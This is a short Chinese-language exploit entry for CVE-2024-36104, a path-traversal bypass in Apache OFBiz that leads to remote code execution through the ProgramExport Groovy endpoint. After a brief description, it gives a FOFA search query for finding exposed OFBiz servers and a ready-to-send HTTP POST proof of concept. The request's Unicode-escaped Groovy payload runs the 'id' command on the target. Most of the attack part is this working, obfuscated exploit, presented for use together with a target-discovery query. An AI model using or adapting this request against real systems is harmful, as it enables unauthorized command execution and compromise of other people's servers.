## Apache-OFBiz存在路径遍历导致RCE漏洞(CVE-2024-36104)

Apache OFBiz是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。是美国阿帕奇（Apache）基金会的一套企业资源计划（ERP）系统。该系统提供了一整套基于Java的Web应用程序组件和工具。Apache OFBiz 18.12.14之前版本存在命令执行漏洞，该漏洞源于org.apache.ofbiz.webapp.control.ControlFilter类对路径（请求URL中的特殊字符（如 ；、%2e）限制不当导致攻击者能够绕过后台功能点的过滤器验证，并通过/webtools/control/ProgramExport接口的编程导出功能执行任意Groovy代码获取系统权限。

## fofa

```
app="Apache_OFBiz"
```

## poc

```
POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1
Host: 
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Content-Type: application/x-www-form-urlencoded
 
groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
```

![image-20240605095313271](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406050953399.png)